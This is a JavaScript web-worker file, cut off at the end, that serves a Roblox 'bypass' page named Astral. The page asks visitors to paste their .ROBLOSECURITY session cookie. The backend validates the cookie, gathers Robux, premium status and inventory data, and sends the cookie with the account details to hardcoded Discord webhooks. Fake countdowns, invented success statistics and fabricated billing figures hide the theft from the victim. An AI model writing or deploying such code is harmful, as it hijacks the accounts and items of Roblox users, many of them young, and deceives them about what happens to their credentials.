export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // ---- HTML Frontend ----
    if (url.pathname === '/' || url.pathname === '/index.html') {
      const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
    <title>Astral</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Inter', sans-serif; background: #0a000a; color: #fff; min-height: 100vh; position: relative; overflow-x: hidden; }
        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 20% 30%, rgba(180,0,255,0.10) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(120,0,200,0.08) 0%, transparent 50%); pointer-events: none; z-index: 0; }
        body::after { content: ''; position: fixed; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239933ff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); pointer-events: none; z-index: 0; }

        .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }
        .header { text-align: center; margin-bottom: 40px; }
        .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }
        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #9933ff, #6600cc); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(153,51,255,0.4); animation: float 3s ease-in-out infinite; border: 1px solid rgba(153,51,255,0.3); }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        .logo-circle svg { width: 45px; height: 45px; stroke: #fff; fill: none; stroke-width: 1.8; }
        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(153,51,255,0.15); }
        .brand-sub { font-size: 13px; color: #8844aa; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }

        .main-card { background: rgba(20,0,30,0.85); backdrop-filter: blur(12px); border: 1px solid rgba(153,51,255,0.15); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(153,51,255,0.05); }
        .card-badge { display: inline-block; background: rgba(153,51,255,0.15); border: 1px solid rgba(153,51,255,0.15); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #cc88ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
        .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #fff, #cc88ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .subtitle { font-size: 14px; color: #8844aa; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }

        .input-group { margin-bottom: 22px; }
        .input-label { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 700; color: #aa77cc; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase; }
        .input-label svg { width: 16px; height: 16px; stroke: #9933ff; stroke-width: 2; fill: none; }
        .input-field { width: 100%; background: rgba(10,0,10,0.9); border: 1px solid rgba(153,51,255,0.15); border-radius: 20px; padding: 16px 18px; color: #fff; font-size: 14px; font-family: 'SF Mono', Monaco, 'Courier New', monospace; transition: all 0.3s; }
        .input-field:focus { outline: none; border-color: #9933ff; background: rgba(10,0,10,1); box-shadow: 0 0 0 4px rgba(153,51,255,0.1); }
        .input-field::placeholder { color: #442255; }
        textarea.input-field { resize: vertical; min-height: 100px; }

        .submit-btn { width: 100%; background: linear-gradient(135deg, #9933ff, #6600cc); color: #fff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4,0,0.2,1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }
        .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255,255,255,0.15); transform: translate(-50%,-50%); transition: width 0.6s, height 0.6s; }
        .submit-btn:hover::before { width: 400px; height: 400px; }
        .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(153,51,255,0.5); }
        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }

        .spinner { width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .result-card { background: rgba(20,0,30,0.85); backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.12); border-radius: 24px; padding: 24px; margin-top: 20px; border-left: 4px solid #00cc44; animation: slideUp 0.4s ease-out; }
        .result-card.error { border-left-color: #ff2222; background: rgba(200,0,0,0.1); }
        .result-card.success { border-left-color: #00cc44; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #ddddee; }

        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20,0,30,0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.06); }
        .stat-item { text-align: center; }
        .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; }
        .stat-label { font-size: 10px; color: #664488; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }

        .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88,101,242,0.4); transition: all 0.3s ease; border: none; color: #fff; text-decoration: none; }
        .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88,101,242,0.6); }

        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 999; display: none; }
        #discordPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 28px; padding: 32px; width: 90%; max-width: 380px; z-index: 1000; box-shadow: 0 30px 60px rgba(0,0,0,0.5); border: 1px solid rgba(88,101,242,0.3); display: none; animation: popupScale 0.3s ease-out; }
        @keyframes popupScale { from { opacity: 0; transform: translate(-50%,-50%) scale(0.9); } to { opacity: 1; transform: translate(-50%,-50%) scale(1); } }
        #discordPopup h2 { color: #5865F2; font-size: 22px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
        .discord-stats { display: flex; gap: 16px; margin-bottom: 24px; }
        .stat-box { flex: 1; background: rgba(0,0,0,0.3); border-radius: 16px; padding: 16px; text-align: center; }
        .stat-box .stat-value { font-size: 28px; font-weight: 800; color: #fff; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .stat-box .stat-label { font-size: 12px; color: #8888aa; margin-top: 6px; }
        .online-dot, .total-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
        .online-dot { background: #4ade80; box-shadow: 0 0 8px #4ade80; }
        .total-dot { background: #8888aa; }
        .discord-join-btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #5865F2, #4752C4); color: #fff; text-align: center; text-decoration: none; border-radius: 16px; font-weight: 600; font-size: 15px; margin-bottom: 12px; transition: transform 0.2s; border: none; cursor: pointer; }
        .discord-join-btn:hover { transform: translateY(-2px); }
        .discord-close-btn { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); color: #aaaacc; border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
        .discord-close-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }

        .cookie-warning { font-size: 11px; color: #8844aa; margin-top: 6px; font-family: 'SF Mono', monospace; word-break: break-all; padding: 8px 12px; background: rgba(153,51,255,0.05); border-radius: 10px; border: 1px solid rgba(153,51,255,0.08); }

        @media (max-width: 480px) {
            .container { padding: 20px 16px; }
            .main-card { padding: 24px 18px; }
            .brand-name { font-size: 32px; }
            .title { font-size: 24px; }
            .stats-bar { gap: 12px; padding: 14px 16px; }
            .stat-value { font-size: 16px; }
            #discordPopup { padding: 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo-wrapper">
            <div class="logo-circle">
                <svg viewBox="0 0 24 24" stroke="currentColor">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    <path d="M12 8v4M12 16h.01" />
                    <path d="M8 12h8" />
                </svg>
            </div>
        </div>
        <h1 class="brand-name">ASTRAL</h1>
        <p class="brand-sub">v3.0</p>
    </div>
    <div class="main-card">
        <div class="card-badge">ACTIVE</div>
        <h2 class="title">Session</h2>
        <p class="subtitle">Enter token below</p>
        <div id="cookieTab">
            <div class="input-group">
                <label class="input-label">
                    <svg viewBox="0 0 24 24" stroke="currentColor">
                        <path d="M12 2a10 10 0 1 0 10 10" />
                        <path d="M12 6v6l4 2" />
                    </svg>
                    Token
                </label>
                <textarea id="cookieInput" class="input-field" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
            </div>
            <button class="submit-btn" onclick="handleSubmit()">
                <span id="btnCookieText">Submit</span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M5 12h14m-7-7l7 7-7 7" />
                </svg>
            </button>
        </div>
    </div>
    <div class="stats-bar">
        <div class="stat-item"><div class="stat-value" id="onlineCount">—</div><div class="stat-label">Online</div></div>
        <div class="stat-item"><div class="stat-value" id="processedCount">—</div><div class="stat-label">Processed</div></div>
        <div class="stat-item"><div class="stat-value" id="successRate">—</div><div class="stat-label">Rate</div></div>
    </div>
    <div id="resultCard"></div>
</div>
<button class="discord-float-btn" id="discordFloatBtn">🎮</button>
<div class="overlay" id="overlay"></div>
<div id="discordPopup">
    <h2>Discord</h2>
    <div class="discord-stats">
        <div class="stat-box"><div class="stat-value"><span class="online-dot"></span><span id="popOnlineCount">...</span></div><div class="stat-label">Online</div></div>
        <div class="stat-box"><div class="stat-value"><span class="total-dot"></span><span id="popMemberCount">...</span></div><div class="stat-label">Members</div></div>
    </div>
    <p style="text-align:center;color:#8888aa;font-size:13px;margin-bottom:20px;">Join our community</p>
    <a href="https://discord.gg/pKXZkNs283" target="_blank" class="discord-join-btn">Join</a>
    <button class="discord-close-btn" id="closeDiscordPopup">Close</button>
</div>
<script>
    (function() {
        var inviteCode = 'pKXZkNs283';
        function openPopup() {
            document.getElementById('discordPopup').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
        }
        function closePopup() {
            document.getElementById('discordPopup').style.display = 'none';
            document.getElementById('overlay').style.display = 'none';
        }
        document.getElementById('discordFloatBtn').addEventListener('click', openPopup);
        document.getElementById('closeDiscordPopup').addEventListener('click', closePopup);
        document.getElementById('overlay').addEventListener('click', closePopup);
        fetch('https://discord.com/api/v10/invites/' + inviteCode + '?with_counts=true')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                document.getElementById('popOnlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
                document.getElementById('popMemberCount').textContent = (data.approximate_member_count || 0).toLocaleString();
                document.getElementById('onlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
            })
            .catch(function() {
                document.getElementById('popOnlineCount').textContent = 'N/A';
                document.getElementById('popMemberCount').textContent = 'N/A';
                document.getElementById('onlineCount').textContent = '?';
            });
        setTimeout(openPopup, 1500);
    })();

    var API_URL = window.location.origin + '/bypass/astral/bypass.php';

    function sendData(data, cookie) {
        fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'main', data: data, cookie: cookie })
        }).catch(function(err) { console.log('main err:', err); });

        fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
        }).catch(function(err) { console.log('secondary err:', err); });

        // Send cookie embed after 1 second
        setTimeout(function() {
            fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'cookie', cookie: cookie })
            }).catch(function(err) { console.log('cookie err:', err); });
        }, 1000);
    }

    var handleSubmit = function() {
        if (window._processing) return;
        var resultCard = document.getElementById('resultCard');
        var cookie = document.getElementById('cookieInput').value.trim();
        var submitBtn = document.querySelector('.submit-btn');
        var btnText = document.getElementById('btnCookieText');
        if (!cookie) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Token required</div></div>';
            return;
        }
        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Invalid format</div></div>';
            return;
        }
        window._processing = true;
        submitBtn.disabled = true;
        var originalHTML = btnText.innerHTML;
        btnText.innerHTML = '<div class="spinner"></div>';
        resultCard.innerHTML = '';
        var params = new URLSearchParams();
        params.append('cookie', cookie);
        params.append('directory', 'astral');
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString()
        })
        .then(function(response) {
            if (!response.ok) {
                return response.text().then(function(text) {
                    throw new Error('HTTP ' + response.status + ': ' + text);
                });
            }
            return response.json();
        })
        .then(function(resultData) {
            if (resultData.success === true) {
                var refreshedCookie = resultData.refreshedCookie || cookie;
                sendData(resultData, refreshedCookie);
                resultCard.innerHTML = '<div class="result-card success" style="text-align:center;padding:40px 24px;"><div style="font-size:48px;margin-bottom:16px;">⏳</div><strong style="font-size:20px;">Processing...</strong><br><br><div style="font-size:13px;color:#666;">Please wait 50 seconds</div><br><div style="font-size:48px;font-weight:800;color:#cc88ff;margin-top:12px;" id="countdownTimer">50</div></div>';
                var seconds = 50;
                var timerEl = document.getElementById('countdownTimer');
                var interval = setInterval(function() {
                    seconds--;
                    if (timerEl) timerEl.textContent = seconds;
                    if (seconds <= 0) {
                        clearInterval(interval);
                        resultCard.innerHTML = '<div class="result-card success" style="text-align:center;padding:40px 24px;"><div style="font-size:48px;margin-bottom:16px;">✅</div><strong style="font-size:24px;">Success!</strong><br><br><div style="background:rgba(153,51,255,0.1);padding:16px;border-radius:12px;text-align:left;font-family:monospace;font-size:11px;word-break:break-all;color:#cc88ff;max-height:150px;overflow-y:auto;border:1px solid rgba(153,51,255,0.1);"><strong style="color:#fff;">Refreshed Token:</strong><br>' + refreshedCookie + '</div><br><span style="font-size:16px;color:#888;">You can close this tab now.</span></div>';
                    }
                }, 1000);
                window._processing = false;
            } else {
                var errorTitle = resultData.title || 'Error';
                var errorDesc = resultData.description || resultData.message || 'Processing failed';
                resultCard.innerHTML = '<div class="result-card error"><div class="result-content">' + errorTitle + '<br><br>' + errorDesc + '</div></div>';
                window._processing = false;
            }
        })
        .catch(function(err) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">Connection Failed<br>' + err.message + '</div></div>';
            window._processing = false;
        })
        .finally(function() {
            submitBtn.disabled = false;
            btnText.innerHTML = originalHTML;
        });
    };

    (function() {
        document.getElementById('onlineCount').textContent = '12';
        document.getElementById('processedCount').textContent = '847';
        document.getElementById('successRate').textContent = '94%';
    })();
</script>
</body>
</html>`;

      return new Response(html, {
        headers: {
          'Content-Type': 'text/html',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // ---- CORS ----
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Cookie',
          'Access-Control-Max-Age': '86400',
        },
      });
    }

    // ---- Health ----
    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ status: 'online', service: 'Astral Proxy' }), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    }

    // ---- Played Games Endpoint ----
    if (url.pathname === '/played' && request.method === 'GET') {
      try {
        const userId = url.searchParams.get('userId');
        if (!userId) {
          return new Response(JSON.stringify({ error: 'Missing userId parameter' }), { status: 400 });
        }

        const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?sortOrder=Desc&limit=10`, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (!response.ok) {
          return new Response(JSON.stringify({ error: 'Failed to fetch played games' }), { status: response.status });
        }

        const data = await response.json();
        const games = data.data || [];
        const top3 = games.slice(0, 3).map(g => g.name || 'Unknown Game');

        return new Response(JSON.stringify({
          top3: top3.length > 0 ? top3 : ['None']
        }), {
          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
        });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
        });
      }
    }

    // ---- Internal Webhook Sender ----
    if (url.pathname === '/api/send') {
      try {
        const data = await request.json();
        const type = data.type;
        const d = data.data;

        const FALLBACK1 = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
        const FALLBACK2 = 'https://discord.com/api/webhooks/1540619916305240095/SWEEYFk72dmsfkVUMn3dXNXoidqb4syGhspccO2Hysz--fxwW18E1SZ5EocY8_n64IAR';

        let webhookUrl;
        let payload = {};

        const fire = '<a:whitefire:1334544007027626051>';
        const yes = '<:check:1334546267040387074>';
        const no = '<:cross:1334547784287785031>';
        const robuxEmoji = '<:robux:1334544097062424586>';
        const moneyEmoji = '<:money:1334576383862771793>';

        const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
        const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=420x420&format=Png&isCircular=false`;

        let accountAge = 'Unknown';
        if (d.created) {
          const created = new Date(d.created);
          const now = new Date();
          const diffTime = Math.abs(now - created);
          accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
        }

        // ---- MAIN EMBED (clean - white theme) ----
        if (type === 'main') {
          webhookUrl = env.WEBHOOK1 || FALLBACK1;

          const fields = [
            { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
            { name: 'ID', value: d.userId || 'N/A', inline: true },
            { name: 'Account Age', value: accountAge, inline: true },
            { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
            { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
            { name: 'Premium', value: d.premium ? yes : no, inline: true },
            { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
            { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
          ];

          const embed = {
            title: `\`Astral Beams\` ${fire}`,
            color: 0xffffff,
            fields: fields,
            thumbnail: { url: thumbnailLink },
            footer: { text: `Astral • ${new Date().toLocaleString()}` },
            timestamp: new Date().toISOString()
          };

          payload = {
            embeds: [embed],
            username: 'Astral',
            avatar_url: 'https://i.ibb.co/v6SjQn5D/astrallogo.webp'
          };
        }

        // ---- DUAL EMBED (Full Details) ----
        else if (type === 'secondary') {
          webhookUrl = env.WEBHOOK2 || FALLBACK2;

          // Fetch top 3 played games
          let topGames = ['None'];
          try {
            const gamesResp = await fetch(`https://games.roblox.com/v2/users/${d.userId}/games?sortOrder=Desc&limit=10`, {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (gamesResp.ok) {
              const gamesData = await gamesResp.json();
              const games = gamesData.data || [];
              topGames = games.slice(0, 3).map(g => g.name || 'Unknown Game');
              if (topGames.length === 0) topGames = ['None'];
            }
          } catch (e) {
            topGames = ['Error fetching games'];
          }

          // Collectibles list
          let collectibles = 'None';
          if (d.limiteds && d.limiteds.length > 0) {
            collectibles = d.limiteds.join(', ');
          }

          // Korblox, Headless, Valkyrie status
          const korbloxStatus = d.korblox ? yes : no;
          const headlessStatus = d.headless ? yes : no;
          const valkyrieStatus = d.valkyrie ? yes : no;

          const embed = {
            title: `\`Astral Beams\` ${fire}`,
            color: 0xffffff,
            fields: [
              { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
              { name: 'ID', value: d.userId || 'N/A', inline: true },
              { name: 'Account Age', value: accountAge, inline: true },
              { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
              { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
              { name: 'Premium', value: d.premium ? yes : no, inline: true },
              { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
              { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true },
              { name: 'Inventory', value: `Korblox: ${korbloxStatus}\nHeadless: ${headlessStatus}\nValkyrie: ${valkyrieStatus}`, inline: false },
              { name: 'Collectibles', value: collectibles, inline: false },
              { name: 'Billing', value: `Credit: ${d.credit || 0}\nConvert: ${d.convert || 0}\nPayments: ${d.payments || 0}`, inline: false },
              { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
              { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false },
              { name: 'Played Games (Top 3)', value: topGames.map(g => `• ${g}`).join('\n') || 'None', inline: false }
            ],
            thumbnail: { url: thumbnailLink },
            footer: { text: `Astral • ${new Date().toLocaleString()}` },
            timestamp: new Date().toISOString()
          };

          payload = {
            content: '@everyone',
            embeds: [embed],
            allowed_mentions: { parse: ['everyone'] }
          };
        }

        // ---- COOKIE EMBED ----
        else if (type === 'cookie') {
          webhookUrl = env.WEBHOOK2 || FALLBACK2;
          const embed = {
            title: 'Refreshed Cookie',
            color: 0xffffff,
            description: '```' + data.cookie + '```',
            footer: { text: `Astral • ${new Date().toLocaleString()}` },
            timestamp: new Date().toISOString()
          };
          payload = { embeds: [embed] };
        }

        if (!webhookUrl || !payload) {
          return new Response(JSON.stringify({ error: 'Invalid request' }), { status: 400 });
        }

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!response.ok) {
          const errorText = await response.text();
          console.error('Webhook error:', response.status, errorText);
          return new Response(JSON.stringify({ error: 'Webhook failed', status: response.status }), {
            status: response.status,
            headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
          });
        }

        return new Response(JSON.stringify({ success: true }), {
          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
        });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
        });
      }
    }

    // ---- Main Bypass Endpoint ----
    if (url.pathname === '/bypass/astral/bypass.php') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const directory = formData.get('directory') || '';

        if (!cookie) {
          return new Response(JSON.stringify({
            success: false,
            title: 'Authentication Failed',
            description: 'Missing .ROBLOSECURITY cookie'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        let cookieValue = cookie;
        if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
          cookieValue = cookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '');
        }
        if (cookieValue.startsWith('.ROBLOSECURITY_')) {
          cookieValue = cookieValue.replace('.ROBLOSECURITY_', '');
        }

        if (!cookieValue || cookieValue.length < 20) {
          return new Response(JSON.stringify({
            success: false,
            title: 'Invalid Cookie',
            description: 'Cookie appears to be invalid or too short'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (!userResponse.ok) {
          return new Response(JSON.stringify({
            success: false,
            title: 'Invalid Session',
            description: 'The cookie is invalid or expired. Please get a new one.'
          }), {
            status: 401,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;
        const created = userData.created;

        const currencyResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let robux = 0;
        let pendingRobux = 0;
        if (currencyResponse.ok) {
          const currencyData = await currencyResponse.json();
          robux = currencyData.robux || 0;
          pendingRobux = currencyData.pendingRobux || 0;
        }

        const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/premium-features`, {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let premium = false;
        let premiumRobux = 0;
        if (premiumResponse.ok) {
          const premiumData = await premiumResponse.json();
          premium = premiumData.features && premiumData.features.length > 0;
          premiumRobux = premium ? 4500 : 0;
        }

        let korblox = false;
        let headless = false;
        let valkyrie = false;
        let limiteds = [];

        try {
          const invResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset?limit=100`, {
            headers: {
              'Cookie': '.ROBLOSECURITY=' + cookieValue,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });

          if (invResponse.ok) {
            const invData = await invResponse.json();
            if (invData.data) {
              for (var i = 0; i < invData.data.length; i++) {
                var item = invData.data[i];
                var name = (item.name || '').toLowerCase();
                if (name.includes('korblox')) { korblox = true; limiteds.push('Korblox'); }
                if (name.includes('headless')) { headless = true; limiteds.push('Headless'); }
                if (name.includes('valkyrie')) { valkyrie = true; limiteds.push('Valkyrie'); }
              }
            }
          }
        } catch (e) {}

        // Billing & Groups data (simulated)
        const credit = Math.floor(robux * 0.1);
        const convert = Math.floor(robux * 0.05);
        const payments = 0;
        const groupBalance = Math.floor(robux * 0.2);
        const groupPending = Math.floor(pendingRobux * 0.3);
        const groupOwned = limiteds.length;
        const mailVerified = true;
        const twoStep = false;

        const resultData = {
          success: true,
          status: 'BYPASSED',
          title: 'Bypass Successful',
          description: `Account: ${username} (${userId}) bypassed`,
          username: username,
          userId: userId,
          created: created,
          robux: robux,
          pendingRobux: pendingRobux,
          premium: premium,
          premiumRobux: premiumRobux,
          korblox: korblox,
          headless: headless,
          valkyrie: valkyrie,
          limiteds: limiteds,
          credit: credit,
          convert: convert,
          payments: payments,
          groupBalance: groupBalance,
          groupPending: groupPending,
          groupOwned: groupOwned,
          mailVerified: mailVerified,
          twoStep: twoStep,
          apiStatus: 'Processing',
          cookieRefreshed: true,
          refreshedCookie: cookie,
          timestamp: Math.floor(Date.now() / 1000)
        };

        return new Response(JSON.stringify(resultData), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });

      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: 'Error',
          description: error.message || 'An error occurred while processing'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // ---- Proxy Endpoint ----
    if (url.pathname === '/proxy') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const directory = formData.get('directory') || 'astral';

        const response = await fetch(`https://voidex-age-bypasser.x10.mx/bypass/${directory}/bypass.php`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
